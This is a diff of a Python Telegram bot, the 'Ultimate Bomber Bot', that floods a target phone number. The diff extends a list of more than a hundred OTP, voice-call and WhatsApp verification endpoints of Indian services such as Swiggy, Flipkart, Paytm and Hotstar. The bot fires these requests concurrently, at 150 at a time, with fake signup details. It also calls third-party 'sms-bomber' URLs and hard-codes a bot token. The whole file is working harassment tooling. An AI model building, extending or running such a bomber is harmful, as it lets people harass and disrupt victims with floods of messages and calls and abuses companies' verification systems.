@@ -15,13 +15,9 @@ from telegram import Update, Bot, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import (
     Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters,
 )
-from starlette.applications import Starlette
-from starlette.responses import PlainTextResponse, Response
-from starlette.routing import Route
 import uvicorn
 
 # ================== CONFIG ==================
-# TOKEN HARDCODED (Tera token yahan hai)
 BOT_TOKEN   = "9192223271:AAEfNQbovDMvHpDnGc4p_-9Zc6hxgOPg_M8"
 WEBHOOK_URL = os.environ.get("RENDER_EXTERNAL_URL", "").rstrip("/")
 PORT        = int(os.environ.get("PORT", 8000))
@@ -29,7 +25,7 @@ PORT        = int(os.environ.get("PORT", 8000))
 CHANNEL_ID   = int(os.environ.get("CHANNEL_ID", "-1004264694127"))
 CHANNEL_LINK = os.environ.get("CHANNEL_LINK", "https://t.me/heisebburgscript")
 
-CONCURRENCY     = 150 # Extreme Speed
+CONCURRENCY     = 150
 DELAY           = 0.1
 REQUEST_TIMEOUT = 5
 # ============================================
@@ -63,13 +59,15 @@ def force_join_keyboard():
     return InlineKeyboardMarkup(keyboard)
 
 # =========================================================================
-#  THE ULTIMATE API LIST (Merged Old + New)
+#  THE ULTIMATE API LIST (Merged: Bot + #Hotstar.txt + all unique)
 # =========================================================================
 def build_endpoints():
     UA_D = "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36"
     E = []
 
-    # ---------- Old APIs (Bombitup + Tsunami + Extras) ----------
+    # =====================================================================
+    # SECTION 1 — FROM EXISTING BOT (voice/call APIs first)
+    # =====================================================================
     E.append({"name":"Swiggy_Call","method":"POST","url":"https://profile.swiggy.com/api/v3/app/request_call_verification","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.swiggy.com"},"data":'{"mobile":"{t}"}'})
     E.append({"name":"TataCapital_Voice","method":"POST","url":"https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}","isOtpViaCallAtLogin":"true"}'})
     E.append({"name":"1MG_Call","method":"POST","url":"https://www.1mg.com/auth_api/v6/create_token","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"number":"{t}","otp_on_call":true}'})
@@ -179,7 +177,9 @@ def build_endpoints():
     E.append({"name":"GoPinkCabs_Old","method":"POST","url":"https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":"check_mobile_number=1&contact={t}"})
     E.append({"name":"Flipkart_2Rome","method":"POST","url":"https://2.rome.api.flipkart.com/api/4/user/otp/generate","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobileNumber":"{t}"}'})
 
-    # ---------- NEW APIs (From API_LIST File) ----------
+    # =====================================================================
+    # SECTION 2 — NEW APIs FROM BOT
+    # =====================================================================
     E.append({"name":"Lenskart_New","method":"POST","url":"https://api-gateway.juno.lenskart.com/v3/customers/sendOtp","headers":{"Content-Type":"application/json","X-API-Client":"mobilesite","X-Country-Code":"IN"},"data":'{"captcha":null,"phoneCode":"+91","telephone":"{t}"}'})
     E.append({"name":"NoBroker_New","method":"POST","url":"https://www.nobroker.in/api/v3/account/otp/send","headers":{"Content-Type":"application/x-www-form-urlencoded"},"data":"phone={t}&countryCode=IN"})
     E.append({"name":"GoKwik","method":"POST","url":"https://gkx.gokwik.co/v3/gkstrict/auth/otp/send","headers":{"Content-Type":"application/json","gk-merchant-id":"19g6jlc658iad"},"data":'{"phone":"{t}","country":"in"}'})
@@ -261,7 +261,9 @@ def build_endpoints():
     E.append({"name":"Foxy_SMS","method":"POST","url":"https://www.foxy.in/api/v2/users/send_otp","headers":{"Content-Type":"application/json","Platform":"web"},"data":'{"user":{"phone_number":"+91{t}"},"via":"sms"}'})
     E.append({"name":"Licius_New","method":"POST","url":"https://www.licious.in/api/login/signup","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}","captcha_token":null}'})
 
-    # ---------- GET APIs ----------
+    # =====================================================================
+    # SECTION 3 — GET APIs (bot)
+    # =====================================================================
     E.append({"name":"BomberWorker","method":"GET","url":"http://sms-bomber.subhxcosmo.workers.dev/api?num={t}","headers":{},"data":None})
     E.append({"name":"BomberVercel","method":"GET","url":"https://bomberrr.vercel.app/?key=roots&number={t}","headers":{},"data":None})
     E.append({"name":"Bolbet","method":"GET","url":"https://bolbet-liart.vercel.app/?key=roots&number={t}","headers":{},"data":None})
@@ -275,7 +277,9 @@ def build_endpoints():
     E.append({"name":"Coolwinks_New","method":"GET","url":"https://api.coolwinks.com/api/accounts/is_already_registered/?username={t}","headers":{},"data":None})
     E.append({"name":"Zee5","method":"GET","url":"https://b2bapi.zee5.com/device/sendotp_v1.php?phoneno={t}","headers":{},"data":None})
 
-    # ---------- Voice Calls ----------
+    # =====================================================================
+    # SECTION 4 — Voice Calls (bot)
+    # =====================================================================
     E.append({"name":"Myntra_Call_New","method":"POST","url":"https://www.myntra.com/gw/mobile-auth/voice-otp","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}"}'})
     E.append({"name":"Flipkart_Call_New","method":"POST","url":"https://www.flipkart.com/api/6/user/voice-otp/generate","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}"}'})
     E.append({"name":"Paytm_Call","method":"POST","url":"https://accounts.paytm.com/signin/voice-otp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
@@ -285,7 +289,9 @@ def build_endpoints():
     E.append({"name":"Kotak_Call","method":"POST","url":"https://www.kotak.com/api/otp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
     E.append({"name":"Amazon_Call","method":"POST","url":"https://www.amazon.in/ap/signin","headers":{"Content-Type":"application/x-www-form-urlencoded"},"data":"phone={t}&action=voice_otp"})
 
-    # ---------- WhatsApp ----------
+    # =====================================================================
+    # SECTION 5 — WhatsApp
+    # =====================================================================
     E.append({"name":"KPN_WA_New","method":"POST","url":"https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6","headers":{"x-app-id":"66ef3594-1e51-4e15-87c5-05fc8208a20f","content-type":"application/json; charset=UTF-8"},"data":'{"notification_channel":"WHATSAPP","phone_number":{"country_code":"+91","number":"{t}"}}'})
     E.append({"name":"KPN_WA_New2","method":"POST","url":"https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0","headers":{"x-app-id":"d7547338-c70e-4130-82e3-1af74eda6797","content-type":"application/json"},"data":'{"phone_number":{"number":"{t}","country_code":"+91"}}'})
     E.append({"name":"Foxy_WA","method":"POST","url":"https://www.foxy.in/api/v2/users/send_otp","headers":{"Content-Type":"application/json"},"data":'{"user":{"phone_number":"+91{t}"},"via":"whatsapp"}'})
@@ -295,9 +301,73 @@ def build_endpoints():
     E.append({"name":"EkaCare_WA","method":"POST","url":"https://auth.eka.care/auth/init","headers":{"Content-Type":"application/json","Client-Id":"androidp"},"data":'{"payload":{"allowWhatsapp":true,"mobile":"+91{t}"},"type":"mobile"}'})
     E.append({"name":"KPN_WA_New3","method":"POST","url":"https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0","headers":{"x-app-id":"d7547338-c70e-4130-82e3-1af74eda6797","content-type":"application/json"},"data":'{"phone_number":{"number":"{t}","country_code":"+91"},"notification_channel":"WHATSAPP"}'})
 
-    return E
+    # =====================================================================
+    # SECTION 6 — #Hotstar.txt UNIQUE (already-present dupes skipped)
+    # =====================================================================
+    E.append({"name":"Hotstar","method":"PUT","url":"https://api.hotstar.com/um/v3/users/037a0fe368304ec798c3a1480936a112/register?register-by=phone_otp","headers":{"Content-Type":"application/json","User-Agent":UA_D,"x-hs-platform":"PCTV","x-country-code":"IN","Origin":"https://www.hotstar.com","Referer":"https://www.hotstar.com/in/subscribe/sign-in"},"data":'{"phone_number":"{t}","country_prefix":"91"}'})
+    E.append({"name":"ALTBalaji","method":"POST","url":"https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.altbalaji.com","Referer":"https://www.altbalaji.com/user-detail?pid=NTU%3D"},"data":'{"phone_number":"{t}","country_code":"91","platform":"web"}'})
+    E.append({"name":"SonyLIV","method":"POST","url":"https://apiv2.sonyliv.com/AGL/1.6/A/ENG/WEB/IN/CREATEOTP","headers":{"Content-Type":"application/json","User-Agent":UA_D,"app_version":"3.1.20","Origin":"https://www.sonyliv.com","Referer":"https://www.sonyliv.com/"},"data":'{"channelPartnerID":"MSMIND","mobileNumber":"{t}","country":"IN"}'})
+    E.append({"name":"Apollo247","method":"POST","url":"https://webapi.apollo247.com/","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.apollo247.com","Referer":"https://www.apollo247.com/medicines"},"data":'{"operationName":"Login","variables":{"mobileNumber":"+91{t}","loginType":"PATIENT"},"query":"query Login($mobileNumber: String!, $loginType: LOGIN_TYPE!) { login(mobileNumber: $mobileNumber, loginType: $loginType) { status message loginId __typename } }"}'})
+    E.append({"name":"FBBOnline","method":"POST","url":"https://www.fbbonline.in/customer/account/GenerateOtp","headers":{"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","User-Agent":UA_D,"X-Requested-With":"XMLHttpRequest","Origin":"https://www.fbbonline.in","Referer":"https://www.fbbonline.in/customer/account/create"},"data":"RegistrationForm%5Bsignup_page%5D=1&RegistrationForm%5Bcontact_number%5D={t}&RegistrationForm%5Bvalid_mobile%5D=1&RegistrationForm%5Bemail%5D=test%40gmail.com&RegistrationForm%5Bvalid_email%5D=1&RegistrationForm%5Bfirst_name%5D=test&RegistrationForm%5Blast_name%5D=test&RegistrationForm%5Bpassword%5D=test1234&RegistrationForm%5Btc_opt_in%5D=on"})
+    E.append({"name":"Grofers","method":"POST","url":"https://grofers.com/v2/accounts/","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D,"Origin":"https://grofers.com","Referer":"https://grofers.com/","app_client":"consumer_web"},"data":"user_phone={t}"})
+    E.append({"name":"Zomato","method":"POST","url":"https://www.zomato.com/webroutes/auth/login","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.zomato.com","Referer":"https://www.zomato.com/"},"data":'{"country_id":1,"phone":"{t}","verification_type":"sms","method":"phone"}'})
+    E.append({"name":"Dream11_GraphQL","method":"POST","url":"https://www.dream11.com/graphql/mutation/pwa/register","headers":{"Content-Type":"application/json","User-Agent":UA_D,"device":"pwa","Origin":"https://www.dream11.com","Referer":"https://www.dream11.com/register?ru="},"data":'{"query":"mutation register( $email: String! $mobileNumber: String! $password: String! $site: String) { registerSendOTPMutation( email: $email mobileNumber: $mobileNumber password: $password site: $site ) { message }}","variables":{"email":"test@gmail.com","mobileNumber":"{t}","password":"test@123astronomia"}}'})
+    E.append({"name":"Careers360","method":"POST","url":"https://www.careers360.com/ajax/no-cache/user/otp-send","headers":{"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","User-Agent":UA_D,"X-Requested-With":"XMLHttpRequest","Origin":"https://www.careers360.com","Referer":"https://www.careers360.com/"},"data":"mobile_number={t}&method=call"})
+    E.append({"name":"Cansell_Signup_Hotstar","method":"POST","url":"https://webapi.cansell.in/api/User/SignUp","headers":{"Content-Type":"application/json;charset=UTF-8","User-Agent":UA_D,"Origin":"https://m.cansell.in","Referer":"https://m.cansell.in/register"},"data":'{"name":"test","surname":"test","email":"test@gmail.com","phone":"{t}","password":"test123"}'})
+    E.append({"name":"IndiaTimes_Gaana","method":"POST","url":"https://jsso1.indiatimes.com/sso/crossapp/identity/native/registerOnlyMobile","headers":{"Content-Type":"application/json; charset=utf-8","User-Agent":UA_D,"appVersion":"8.9.0","channel":"gaana.com","platform":"android"},"data":'{"mobile":"+91-{t}"}'})
+    E.append({"name":"Flipkart_Rome","method":"POST","url":"https://1.rome.api.flipkart.com/1/action/view","headers":{"Content-Type":"application/json","User-Agent":UA_D,"x-user-agent":UA_D,"Origin":"https://www.flipkart.com","Referer":"https://www.flipkart.com/login"},"data":'{"actionRequestContext":{"type":"LOGIN_IDENTITY_VERIFY","loginIdPrefix":"+91","loginId":"{t}","loginType":"MOBILE","verificationType":"OTP","screenName":"LOGIN_V4_MOBILE","sourceContext":"DEFAULT"}}'})
+    E.append({"name":"Paytm_Register","method":"POST","url":"https://accounts.paytm.com/v2/api/register","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://accounts.paytm.com","Referer":"https://accounts.paytm.com/"},"data":'{"email":"","mobile":"{t}","loginPassword":"Test@1090","csrfToken":"f7ea628c-91a2-5f14-82ca-6f7eee295b1d","redirectUri":"https://paytm.com/v1/api/authresponse","clientId":"paytm-web-secure","scope":"paytm","state":"","responseType":"code","theme":"mp-html5","dob_agreement":true}'})
+    E.append({"name":"Ogonn","method":"POST","url":"https://ogonn.in/otp","headers":{"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","User-Agent":UA_D,"Origin":"https://ogonn.in","Referer":"https://ogonn.in/login","X-Requested-With":"XMLHttpRequest"},"data":"mobile={t}"})
+    E.append({"name":"Swiggy_Signup","method":"POST","url":"https://www.swiggy.com/mapi/auth/signup","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.swiggy.com","Referer":"https://www.swiggy.com/auth/register"},"data":'{"name":"test","email":"test@gmail.com","password":"test1234","mobile":"{t}"}'})
+    E.append({"name":"Limeroad","method":"POST","url":"https://www.limeroad.com/auth/get_uuid_v2?ajax=true","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D,"Origin":"https://www.limeroad.com","Referer":"https://www.limeroad.com/"},"data":"user_id={t}"})
+    E.append({"name":"AJIO_Signup","method":"POST","url":"https://login.web.ajio.com/api/auth/signupSendOTP","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.ajio.com","Referer":"https://www.ajio.com/signup"},"data":'{"firstName":"test","login":"test@gmail.com","password":"test@123nxnxn","mobileNumber":"{t}","requestType":"SENDOTP"}'})
+    E.append({"name":"BigBasket_OTP","method":"POST","url":"https://www.bigbasket.com/mapi/v4.0.0/member-svc/otp/send/","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.bigbasket.com","Referer":"https://www.bigbasket.com/auth/login/","x-channel":"BB-PWA"},"data":'{"identifier":"{t}"}'})
+    E.append({"name":"Banggood","method":"POST","url":"https://m.banggood.in/index.php?com=login&t=sendMtSms&c=api","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D,"Origin":"https://m.banggood.in","Referer":"https://m.banggood.in/login.html"},"data":"mobilePhone={t}&countryPhoneCode=91&type=1"})
+    E.append({"name":"UrbanClap","method":"POST","url":"https://www.urbanclap.com/api/v2/growth/profile/generateOTP","headers":{"Content-Type":"application/json;charset=UTF-8","User-Agent":UA_D,"Origin":"https://www.urbancompany.com","Referer":"https://www.urbancompany.com/"},"data":'{"country_id":"IND","phone":{"isd_code":"+91","phone_wo_isd":"{t}"},"device_type":"customer"}'})
+    E.append({"name":"Quikr","method":"POST","url":"https://www.quikr.com/core/sendOtp?_t=0e2ed2ef8cff0015a917b9cf98ccaea3","headers":{"Content-Type":"application/x-www-form-urlencoded;charset=UTF-8","User-Agent":UA_D,"Origin":"https://www.quikr.com","Referer":"https://www.quikr.com/SignIn"},"data":"user={t}&v3=true"})
+    E.append({"name":"Kotak811","method":"POST","url":"https://www.kotak.com/811-savingsaccount-ZeroBalanceAccount/811/save-home-mobile.action","headers":{"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","User-Agent":UA_D,"Origin":"https://www.kotak.com","Referer":"https://www.kotak.com/811-savingsaccount-ZeroBalanceAccount/811/vkyc-home.action"},"data":"cust_full_name=Test&cust_email=test%40gmail.com&cust_mobile={t}&cust_political_disclaimer=Yes&cust_fatca_disclaimer=Yes"})
+    E.append({"name":"HappyEasyGo","method":"GET","url":"https://m.happyeasygo.com/heg_api/user/sendRegisterOTP.do?phone=91%20{t}","headers":{"User-Agent":UA_D,"Referer":"https://m.happyeasygo.com/register","x-device":"mobile"},"data":None})
+    E.append({"name":"MakeMyTrip","method":"POST","url":"https://mapi.makemytrip.com/ext/web/pwa/isUserRegistered","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.makemytrip.com","Referer":"https://www.makemytrip.com/","region":"in"},"data":'{"loginId":"{t}","type":"MOBILE","version":2,"countryCode":"91"}'})
+    E.append({"name":"Ola_Login","method":"POST","url":"https://accounts.olacabs.com/api/login","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://accounts.olacabs.com","Referer":"https://accounts.olacabs.com/"},"data":'{"mobileNumber":"{t}","dialingCode":"+91","countryCode":"IN"}'})
+    E.append({"name":"OYO","method":"POST","url":"https://www.oyorooms.com/api/pwa/generateotp?locale=en","headers":{"Content-Type":"text/plain;charset=UTF-8","User-Agent":UA_D,"Origin":"https://www.oyorooms.com","Referer":"https://www.oyorooms.com/login"},"data":'{"phone":"{t}","country_code":"+91","nod":4}'})
+    E.append({"name":"Dominos","method":"POST","url":"https://api.dominos.co.in/loginhandler/forgotpassword","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://m.dominos.co.in","Referer":"https://m.dominos.co.in/"},"data":'{"lastName":"","mobile":"{t}","firstName":""}'})
+    E.append({"name":"KFC_New","method":"POST","url":"https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin","headers":{"Content-Type":"application/json;charset=UTF-8","User-Agent":UA_D,"Origin":"https://online.kfc.co.in","Referer":"https://online.kfc.co.in/login"},"data":'{"phoneNumber":"{t}","AuthorizedFor":"3","Resend":"false"}'})
+    E.append({"name":"BurgerKing","method":"POST","url":"https://consumer-apis.burgerking.in/api/v1/user/signUp","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.burgerking.in","Referer":"https://www.burgerking.in/","platform":"web"},"data":'{"phone_no":"{t}"}'})
+    E.append({"name":"Purplle_Get","method":"GET","url":"https://www.purplle.com/api/account/authorization/send_otp?phone={t}&action=register","headers":{"User-Agent":UA_D,"Referer":"https://www.purplle.com/login"},"data":None})
+    E.append({"name":"Tatacliq","method":"POST","url":"https://www.tatacliq.com/api/v1/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.tatacliq.com","Referer":"https://www.tatacliq.com/login"},"data":'{"mobile":"{t}","countryCode":"+91"}'})
+    E.append({"name":"Myntra_Post","method":"POST","url":"https://www.myntra.com/api/auth/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.myntra.com","Referer":"https://www.myntra.com/login"},"data":'{"phone":"{t}","country":"IN"}'})
+    E.append({"name":"Nykaa_Post","method":"POST","url":"https://www.nykaa.com/api/v1/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.nykaa.com","Referer":"https://www.nykaa.com/login"},"data":'{"mobile":"{t}","country_code":"91"}'})
+    E.append({"name":"PharmEasy_Post","method":"POST","url":"https://api.pharmeasy.in/api/v1/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.pharmeasy.in","Referer":"https://www.pharmeasy.in/login"},"data":'{"phone":"{t}","country":"IN"}'})
+    E.append({"name":"1mg_Post","method":"POST","url":"https://api.1mg.com/api/v1/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.1mg.com","Referer":"https://www.1mg.com/login"},"data":'{"mobile":"{t}","country":"IN"}'})
+    E.append({"name":"HealthKart_Post","method":"POST","url":"https://www.healthkart.com/api/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.healthkart.com","Referer":"https://www.healthkart.com/login"},"data":'{"phone":"{t}","country":"IN"}'})
+    E.append({"name":"Cultfit_Post","method":"POST","url":"https://api.cult.fit/api/v1/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.cult.fit","Referer":"https://www.cult.fit/login"},"data":'{"mobile":"{t}","country":"IN"}'})
+    E.append({"name":"FabIndia","method":"POST","url":"https://www.fabindia.com/api/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.fabindia.com","Referer":"https://www.fabindia.com/login"},"data":'{"phone":"{t}","country":"IN"}'})
+    E.append({"name":"Pepperfry","method":"POST","url":"https://www.pepperfry.com/api/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.pepperfry.com","Referer":"https://www.pepperfry.com/login"},"data":'{"mobile":"{t}","country":"IN"}'})
+    E.append({"name":"FirstCry","method":"POST","url":"https://www.firstcry.com/api/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.firstcry.com","Referer":"https://www.firstcry.com/login"},"data":'{"phone":"{t}","country":"IN"}'})
+    E.append({"name":"Clovia","method":"POST","url":"https://www.clovia.com/api/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.clovia.com","Referer":"https://www.clovia.com/login"},"data":'{"mobile":"{t}","country":"IN"}'})
+    E.append({"name":"Bewakoof","method":"POST","url":"https://www.bewakoof.com/api/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.bewakoof.com","Referer":"https://www.bewakoof.com/login"},"data":'{"phone":"{t}","country":"IN"}'})
+    E.append({"name":"SouledStore","method":"POST","url":"https://www.souledstore.com/api/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.souledstore.com","Referer":"https://www.souledstore.com/login"},"data":'{"mobile":"{t}","country":"IN"}'})
+    E.append({"name":"Jabong","method":"POST","url":"https://www.jabong.com/api/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.jabong.com","Referer":"https://www.jabong.com/login"},"data":'{"mobile":"{t}","country":"IN"}'})
+    E.append({"name":"Shopclues","method":"POST","url":"https://www.shopclues.com/api/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.shopclues.com","Referer":"https://www.shopclues.com/login"},"data":'{"phone":"{t}","country":"IN"}'})
+    E.append({"name":"Dailyhunt","method":"POST","url":"https://www.dailyhunt.in/api/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.dailyhunt.in","Referer":"https://www.dailyhunt.in/login"},"data":'{"mobile":"{t}","country":"IN"}'})
+    E.append({"name":"Inshorts","method":"POST","url":"https://www.inshorts.com/api/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.inshorts.com","Referer":"https://www.inshorts.com/login"},"data":'{"phone":"{t}","country":"IN"}'})
+
+    # =====================================================================
+    # DEDUPE — by (method, url) pair, keep first occurrence
+    # =====================================================================
+    seen = set()
+    deduped = []
+    for ep in E:
+        key = (ep["method"], ep["url"])
+        if key in seen:
+            continue
+        seen.add(key)
+        deduped.append(ep)
+
+    return deduped
 
 ENDPOINTS = build_endpoints()
+logger.info(f"✅ Loaded {len(ENDPOINTS)} unique endpoints")
 
 # ================== HTTP SESSION ==================
 async def get_http_session() -> aiohttp.ClientSession:
@@ -411,27 +481,23 @@ async def run_bombing(uid: int, s: dict):
     except Exception:
         pass
 
-# ================== DUMMY WEB SERVER ==================
+# ================== WEB SERVER ==================
 async def handle_web(request):
-    return web.Response(text="Ghost-OS Bot is Running!")
+    return PlainTextResponse("Ghost-OS Bot is Running!")
 
 async def start_web_server():
-    app = web.Application()
-    app.router.add_get('/', handle_web)
-    runner = web.AppRunner(app)
-    await runner.setup()
     port = int(os.environ.get("PORT", 8080))
-    site = web.TCPSite(runner, '0.0.0.0', port)
-    await site.start()
-    logger.info(f"✅ Web server started on port {port}")
+    config = uvicorn.Config(handle_web, host="0.0.0.0", port=port, log_level="warning")
+    server = uvicorn.Server(config)
+    await server.serve()
 
 # ================== MAIN ==================
 async def main():
-    await start_web_server()
+    web_task = asyncio.create_task(start_web_server())
 
     logger.info("Starting Ultimate Bomber Bot...")
     app = Application.builder().token(BOT_TOKEN).build()
-    
+
     app.add_handler(CommandHandler("start", start_cmd))
     app.add_handler(CallbackQueryHandler(button_handler))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
@@ -439,9 +505,9 @@ async def main():
     await app.initialize()
     await app.start()
     await app.updater.start_polling()
-    
+
     logger.info("✅ Bot is live. Waiting for commands...")
-    
+
     while True:
         await asyncio.sleep(3600)
 
